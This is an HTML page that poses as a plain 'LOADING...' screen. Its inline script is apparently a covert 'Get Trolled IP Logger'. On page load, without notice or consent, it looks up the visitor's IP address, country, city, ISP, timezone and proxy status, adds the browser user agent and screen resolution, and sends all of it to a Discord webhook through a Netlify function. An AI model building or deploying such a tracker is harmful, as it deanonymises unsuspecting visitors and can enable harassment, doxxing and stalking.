<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Loading...</title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      color: white;
      font-family: 'Arial Black', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      user-select: none;
      text-align: center;
      padding: 10px;
    }
    #loading-text {
      font-size: 6rem;
      letter-spacing: 0.3em;
      animation: flickerGTA 2.5s infinite alternate;
      user-select: none;
    }
    @keyframes flickerGTA {
      0%, 100% { opacity: 1; }
      40%, 60% { opacity: 0.3; }
    }
    #log-status {
      margin-top: 30px;
      font-size: 1.4rem;
      font-weight: bold;
      color: #0f0;
      max-width: 90vw;
      word-wrap: break-word;
      cursor: default;
    }
    #log-status.error {
      color: #f33;
      cursor: pointer;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div id="loading-text">LOADING...</div>
  <div id="log-status" title="Click to copy error message"></div>

  <script>
    const netlifyFunctionUrl = "/.netlify/functions/log-ip";
    const logStatus = document.getElementById('log-status');

    function safeGet(obj, path, defaultValue = '') {
      return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
    }

    async function fetchIPInfo() {
      const res = await fetch('https://ipwhois.app/json/');
      if (!res.ok) throw new Error('Failed to fetch IP info');
      return res.json();
    }

    async function sendDiscordWebhook(embed) {
      try {
        const res = await fetch(netlifyFunctionUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: [embed] }),
        });
        if (!res.ok) {
          const errorText = await res.text();
          throw new Error(`Logging failed: ${res.status} - ${errorText}`);
        }
        const json = await res.json();
        return json.message || "Logged successfully";
      } catch (e) {
        throw e;
      }
    }

    (async () => {
      try {
        const data = await fetchIPInfo();

        const embed = {
          title: "🕵️ New Visitor Logged",
          color: 0x00ffff,
          timestamp: new Date().toISOString(),
          footer: {
            text: "Get Trolled IP Logger",
            icon_url: "https://i.imgur.com/qZ7j0fV.png"
          },
          thumbnail: {
            url: data.country_flag || ""
          },
          author: {
            name: "Get Trolled IP Logger",
            url: "https://discord.com",
            icon_url: "https://i.imgur.com/qZ7j0fV.png"
          },
          fields: [
            { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
            { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
            { name: "Region", value: `${data.region}`, inline: true },
            { name: "City", value: `${data.city}`, inline: true },
            { name: "ISP", value: `${data.isp}`, inline: false },
            { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
            { name: "VPN/Proxy Detected", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
            { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
          ]
        };

        const result = await sendDiscordWebhook(embed);
        logStatus.textContent = `✅ Success: ${result}`;
        logStatus.classList.remove('error');
        logStatus.title = "";
      } catch (err) {
        logStatus.textContent = `❌ Error: ${err.message}\n\nTap here to copy`;
        logStatus.classList.add('error');
        logStatus.title = "Tap to copy error message";

        logStatus.onclick = () => {
          navigator.clipboard.writeText(err.message)
            .then(() => alert("Error message copied! Send it to me."))
            .catch(() => alert("Failed to copy error message."));
        };
      }
    })();
  </script>
</body>
</html>
